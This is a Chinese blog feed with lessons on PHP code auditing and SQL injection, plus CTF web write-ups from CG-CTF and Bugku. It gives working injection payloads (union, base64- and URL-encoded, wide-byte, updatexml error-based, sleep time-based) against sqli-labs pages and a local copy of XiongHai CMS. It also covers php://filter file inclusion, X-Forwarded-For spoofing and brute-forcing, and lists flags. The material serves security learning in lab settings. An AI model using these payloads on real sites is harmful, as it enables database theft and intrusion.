    <content type="text"><![CDATA[0x00 简介 为什么第一章我们学习，因为看这篇文章的朋友大概也看过我前面写的MySQL_wiki系列，这里来SQL注入的话我们能方便理解，同时sql注入也是审计中我们经常想要找到的，比较以来就getshell什么的也不现实这种漏洞也不多。 0x01 字符型注入这里我们看到sqli-libs第一关的代码 12345678910111213141516171819202122232425262728293031323334&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&apos;id&apos;]))&#123;$id=$_GET[&apos;id&apos;];//logging the connection parameters to a file for analysis.$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;);fclose($fp);// connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if($row) &#123; echo &quot;&lt;font size=&apos;5&apos; color= &apos;#99FF00&apos;&gt;&quot;; echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;/font&gt;&quot;; &#125; else &#123; echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; &#125;&#125; else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt; 我们可以看到调用$_GET[&#39;id&#39;]获取参数内容，没有经过任何过来带入了SQL语句的查询，也就是代码没有任何过来且没开魔术引号，那么将会形成注入，如果开启魔术引号遇到数字型的我们还是能够注入的，因为magic_quotes_gpc只会转义单引号、双引号、反斜线、NULL，但是数字型注入我们可以不试用到这些。 1http://127.0.0.1/sqli/Less-1/?id=-1%27union%20select%201,user(),3--%20+ 0x02 编码类注入有些为了业务需要他会把传入一些编码后的参数再解码带入数据库查询，我们常见的有base64编码，也有的程序会内置url解码，这类写法通常见于框架。 1.base64 1234567891011121314151617&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=base64_decode($_GET[&apos;id&apos;]);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if ($row) &#123; echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;; echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;; echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;&#125;else&#123; print_r(mysql_error());&#125;echo &apos;&lt;hr&gt;&apos;;echo &quot;查询的语句是：$sql&quot;;?&gt; 传入的值base64解密后带入查询，这种注入魔术引号是没办法拦截的，当我们遇到网站为base64编码的参数时可以留意下。 1http://127.0.0.1/sqli/Less-1/base64.php?id=JyB1bmlvbiBzZWxlY3QgMSx1c2VyKCksMyAtLSAr 2.urldecode 1234567891011121314151617&lt;?phpinclude(&quot;../sql-connections/sql-connect.php&quot;);$id=urldecode($_GET[&apos;id&apos;]);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if ($row) &#123; echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;; echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;; echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;&#125;else&#123; print_r(mysql_error());&#125;echo &apos;&lt;hr&gt;&apos;;echo &quot;查询的语句是：$sql&quot;;?&gt; 因为接受的参数只会被url解码一次，传入的值不是魔术引号认识的值所以可以绕过 1http://127.0.0.1/sqli/Less-1/base64.php?id=%2527union%20select%201,user(),3--%20+ 0x03 宽字节注入12345678910111213141516171819&lt;?php$conn = mysql_connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;);mysql_select_db(&quot;security&quot;,$conn);mysql_query(&quot;set names &apos;gbk&apos; &quot;,$conn);$id=urldecode($_GET[&apos;id&apos;]);$sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result); if ($row) &#123; echo &quot;id:&quot;.$row[&apos;id&apos;].&quot;&lt;br&gt;&quot;; echo &quot;用户名:&quot;.$row[&apos;username&apos;].&quot;&lt;br&gt;&quot;; echo &quot;密码:&quot;.$row[&apos;password&apos;].&quot;&lt;br&gt;&quot;;&#125;else&#123; print_r(mysql_error());&#125;echo &apos;&lt;hr&gt;&apos;;echo &quot;查询的语句是：$sql&quot;;?&gt; 网上有很多解释大家可以搜索一下我这里就不详细介绍了大概原因就是: id=1’-&gt;id=1\’-&gt;id=1%5c%27 id=1%df’-&gt;id=1%df%5c%27-&gt;id=1%DF5C%27-&gt;id=1運’ 当然还有其他各种类型的注入这里就不一一列举了，看了mysql系列文章的大概都知道，不知道的可以看看。 0x04 过滤通常情况下一个成熟的cms是不存在不过滤的情况，一般的程序选择用函数来过滤比如addslashes()，也可以开启魔术引号，但是更多的程序它采用正则匹配来过滤，使用不正确的匹配替换方式反而导致被绕过的机会更大，比如有的程序把union 替换为空，那么我们就可以双写ununionion绕过从而还可能绕过外部WAF,对于整数型一般采用intval()等字符转换，后期通过实战一步一步讲解。 0x05 实战审计找了半天源码，还是用这款熊海CMS V1.0吧，这款CMS感觉不错，什么洞都有，非常适合我们学习审计，同时审计这个cms的文章很多，大家如果觉得我写的不如人意，还能看看别人。 首先我们审计对传入的参数如果想快速的看是否有全局过滤，不妨找个文件输出一下$_POST、$_GET等等。 12echo $_POST[&apos;b&apos;];echo $_GET[&apos;a&apos;]; 没有全局过滤 我们来到后台登陆文件admin/files/login.php 看看login.php一般登陆存在注入的可能性还是很大的 很明显 带入查询的user没有经过任何过滤，同时输出了错误，所以可以用报错查询，当然你也选择万能密码。 payload: 1user=1111&apos; and (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- +&amp;password=111&amp;login=yes 在看看留言板 files/submit.php 传入参数没有过滤 同时插入的时候，这里使用了mysql_error()所以可以用报错注入，否则只能使用盲注了。 payload: 1cid=0&amp;name=&apos;or updatexml(1,concat(0x7e,(version())),0) or&apos;&amp;mail=1111&amp;url=http%3A%2F%2F1&amp;content=%E9%98%BF%E5%BE%B7&amp;save=%E6%8F%90%E4%BA%A4&amp;randcode=&amp;jz=1&amp;tz=1 开始我们说过不是使用了过滤函数就万事大吉了，数字型注入可以不使用引号 我们看到传入的cid已经被addslashes()函数转义了，查询的地方都没啥问题，但是到浏览计数的时候调用了它，那么我们就可以使用盲注或者报错注入了，因为有错误回显。 payload： 1http://127.0.0.1/xhcms/?r=content&amp;cid=1%20and%20If(ascii(substr(database(),1,1))%3C10,0,sleep(10)) 这个系统还有其他注入，想练手的自己下载审计一下，总体思路有用户交互的地方都有可能存在注入，这也是我们没有通读代码的一个审计思路。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[1.1.初识代码审计]]></title>
    <url>%2F2019%2F09%2F28%2F1-1-%E5%88%9D%E8%AF%86%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[0x00 简介 终于来到了代码审计篇章。希望看了朋友有所收获，我们通常把代码审计分为黑盒和白盒，我们一般结合起来用。 通常我们白盒审计有多种方法我们可以归纳为： 1.通读全文 2.回溯 其中通读全文费时间，但是有利于代码审计的经验积累，也能更深入的挖掘一些难以发现的漏洞。功能回溯我们可以定向的审计一些功能和函数，最常见的就是对命令执行函数的回溯，和上传等功能的审计。通过熟悉白盒审计有利于漏洞的发掘，因为代码审计和开发都能熟悉到程序中那些地方会存在对数据库的操作和功能函数的调用，举个简单的例子当我们看到download的时候，我们就会想到是不是有任意文件下载。 0x01 环境与工具我们在代码审计中又可以分为静态和动态，静态我们通常用于无法搭建原来的环境只能看代码逻辑来判断是否存在漏洞，而动态调试就可以debug、输出、监控SQL语句来看非常方便。 接下来代码审计工具基本就用到Sublime Text 3、VSCode、Seay源代码审计系统、PHPStorm+XDebug、文件对比、MYSQL监控、编码转换、正则调试等。其中文件对比工具可以拿来和更新补丁后的文件进行对于对比定位漏洞代码区，PHPStorm+XDebug可以动态调试定位漏洞成因,也有利于漏洞的发掘。当然你也可以用那些自动化审计的，貌似还支持代码回溯，还是能审计到一些漏洞的。环境能用基本就用phpstudy了。 0x02 知识准备代码审计我们需要对php有一定的了解，当然是越深入越好，我们也不纠结，代码审计需不需要精通php什么的，只能说知识面在什么层次就能审计到什么层次的漏洞，但是至少你得看得懂代码。 我们应该具备一些知识： 1.基本的正则 2.数据库的一些语法(这个我在前面的数据库维基已经讲的差不多了) 3.至少你得看懂php代码 4.php配置文件以及常见函数 0x03 关于文章的一些问题前面我们的实验环境我基本上不会使用框架类的，我尽量使用一些很普通的网站，还有如何用phpstudy之类的来本地搭建网站这些我也不会讲，这些基础的问题搜索一下就有，不能独立解决问题怎么能进步，遇到一些特殊的问题我还是会说一下的。 0x04 文末当然如果你跟我一样是一个新手才入门代码审计，看这篇文章最好不过了，因为我会讲的很细,当然我可能很多东西也讲不到，还请大家多看看别人的审计思路，只有不断的学习才有提高。]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CG_ctf_writeup]]></title>
    <url>%2F2019%2F09%2F25%2FCG-ctf-writeup%2F</url>
    <content type="text"><![CDATA[题目连接 一，签到题 右键检查元素找到flag 二，md5 collision php弱类型 == 比较时会把科学计数0E加一串数字看成0 QNKCDZO MD5 加密后为0e830400451993494058024219903391 即上面那种形式 只要找到这样形式的解密后的字符串就可以了 现成的有如下 QNKCDZO0e830400451993494058024219903391 s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 带入其中一个得到flag 三，签到2发现输入框不能把全部文字输入 右键检查元素更改输入长度再输入 得到flag 四，这题不是WEB点进去有字有图片，检查元素没有结果 题目提示不是web，于是保存图片后用txt打开后搜索nctf得到flag 五，层层递进进去之后是一个网页 右键点击检查元素 web文件夹里面发现404.html点进去发现flag nctf{this_is_a_fl4g} 六，AAencode打开是乱码用火狐打开更改编码方式 复制转码后的表情到控制台 我用的是IE浏览器的控制台 在页面上得到flag 七，单身二十年题目说试试手速，即网页很快就跳走了 于是想到用Burp抓包就可以得到flag 八，php decode发现一段php代码 贴到在线工具把eval改成echo就可以得到flag 九, 文件包含http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/read=convert.base64-encode/resource=index.php 利用php伪协议进行做题 file=php://filter/read=convert.base64-encode/resource=index.php 对index.php源码进行编码 该网址得到一串base64码 解码得到源码下面有flag nctf{edulcni_elif_lacol_si_siht} 十，单身一百年也没用]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugkuCTF-WEB-WriteUp(持续更新)]]></title>
    <url>%2F2019%2F09%2F25%2FBugkuCTF-WEB-WriteUp-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%2F</url>
    <content type="text"><![CDATA[1，web2 右键检查元素 得到key KEY{Web-2-bugKssNNikls9100} 2，计算器 发现只能输入一位数 右键检查元素更改输入长度 然后输入和得到keyflag{CTF-bugku-0032} 3，web基础$_GET 题目要用get传值构造 得到flag flag{bugku_get_su8kej2en} 4，web基础$_POST 用火狐浏览器进行post 得到flag flag{bugku_get_ssseint67se} 5，矛盾 是数字又不是数字构造得到flag flag{bugku-789-ps-ssdf} 6,web3打开网站一直弹窗右键检查元素得到 一串unicode码 &#75;&#69;&#89;&#123;&#74;&#50;&#115;&#97;&#52;&#50;&#97;&#104;&#74;&#75;&#45;&#72;&#83;&#49;&#49;&#73;&#73;&#73;&#125; 转ascii码得到 KEY{J2sa42ahJK-HS11III} 7，你必须让他停下按进去网页一直跳来跳去 题目说要让他停下来于是 进行抓包得到flag flag{dummy_game_1s_s0_popular} 8，变量1与南邮解法一样 9，web5右键检查元素发现字符复制出来在控制台运行 得到flag CTF{WHATFK} 题目提示大写 10，头等舱抓包得到flag flag{Bugku_k8_23s_istra} 11，网站被黑后台扫描得到两个200网址 出现登录界面，随便输入密码进行抓包 send to intruder add那个密码串 选中自带密码进行抓包 长度不一样的就是代码 输入密码得到flag flag{hack_bug_ku035} 12，管理员系统右键检查元素得到一串base64码 解密得到 test123 应该是密码，用户名用admin 登录提示用本地管理员登录 对他进行抓包 X-Forwarded-For: 127.0.0.1 伪装成本地ip 按go 得到flag 85ff2ee4171396724bae20c0bd851f6b 13，web4看看源码得到一串字符 unescape解密得到 var p1 = 'function checkSubmit(){var a=document.getElementById("password");if("undefined"!=typeof a){if("67d709b2b'; var p2 = 'aa648cf6e87a7114f1"==a.value)return!0;alert("Error");a.focus();return!1}}document.getElementById("levelQuest").onsubmit=checkSubmit;'; eval(unescape(p1) + unescape('54aa2' + p2)); 拼接得到67d709b2b54aa2aa648cf6e87a7114f1 输入得到flag KEY{J22JK-HS11} 14，输入密码查看flag五位数密码，抓包进行爆破 得到密码13579 输入得到flag flag{bugku-baopo-hah} 15，点击一百万次post传值右键检查元素 进行post传值 得到flag flag{Not_C00kI3Cl1ck3r}]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计]]></title>
    <url>%2F2019%2F08%2F19%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php]]></title>
    <url>%2F2019%2F08%2F15%2Fphp%2F</url>
    <content type="text"><![CDATA[php基础 [TOC]]]></content>
  </entry>
  <entry>
    <title><![CDATA[ctf基础入门]]></title>
    <url>%2F2019%2F04%2F04%2Fctf%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[（1）信息收集]]></content>
      <tags>
        <tag>-ctf入门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql注入]]></title>
    <url>%2F2019%2F03%2F25%2Fmysql%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[[TOC] （1）sql注入原理 （2）常见的MySQL注入​ MySQL数据库结构​ 数据库A=网站A表名​ 列名​ 数据​ 数据库B=网站B表名​ 列名​ 数据​ 数据库C=网站C表名​ 列名​ 数据获取字段数：order by x 取临界值输入注意1%20是空格的意识获取数据库名： database()获取数据库版本：version()各表名 （3）高权限文件插入注入数据用户：user()操作系统：@@version_compile_osMysql 注入文件操作不同用户数据库读取文件权限文件读入： select load_file(‘文件路径’)文件写入函数：select ‘内容’ into outfile ‘储存路径’实际操作需要知道网站路径；获取方法 报错显示 谷歌黑客网站带有warning关键字的寻找该网站的错误信息如图site:+该网站 空格 warning 读取配置文件 漏洞报错 遗留文件网址后面加/phpinfo.php里面有网站路径 字典猜解注意：路径符号及编码斜杆可以/或\避免斜杆n （4）防护函数魔术引号 magic_quotes_gpc 开关 安全函数 addslashes注入时要单引号等会被转义绕过思路（1）编码绕过 (2) 宽字节注入 （5）高权限跨库注入跨库注入条件：root权限 （6）提交方式注入 1.GET ：?x=1 2.POST登录注入 一般是登入框有 单引post注入 3.COOLIE验证注入 抓包 没有 Cookie:自己写一下 （7）.HTTP头部注入实际情况下，有部分站点接受数据是以数据包中的http头部进去数据 接受，所以测试注入点的时候，需要注入语句写到http头部中。 （8）.参数类型注入数字，字符，搜索型 字符型的注入例子 如果是字符型一般会存在单引号要考虑屏蔽 如果不考虑注入语句会被写入单引号内 所以前面的单引号加另一半屏蔽后面的加#号屏蔽 %27为一个单引号%23为#号 搜索型的注入例子 （9）参数加解密注入加解密注入 常见加密格式： 如果网站后面跟着这样的赋值要想到加密 如base加密 （10）盲注攻击-基于时间延迟注入（上）盲注与普通注入区别 sleep()延迟作用 if(条件,true,false)如果条件为真返回第一个，假返回第二个 mid(str,截取的位数,第几个)截取 ord ascii编码 运用 可以先知道他的位数 （11）盲注攻击-基于时间延迟注入（下）获取表名 单个字的匹配 如用mid截取第一位的值判断 用ascii码来代替字符 （12）Mysql_insert四种注入参考网站： []: https://websec.ca/kb/sql_injection “点击查看” （13）Mysql_update四种注入 （14）Mysql_delete四种注入]]></content>
      <tags>
        <tag>-ctf入门</tag>
      </tags>
  </entry>
</search>
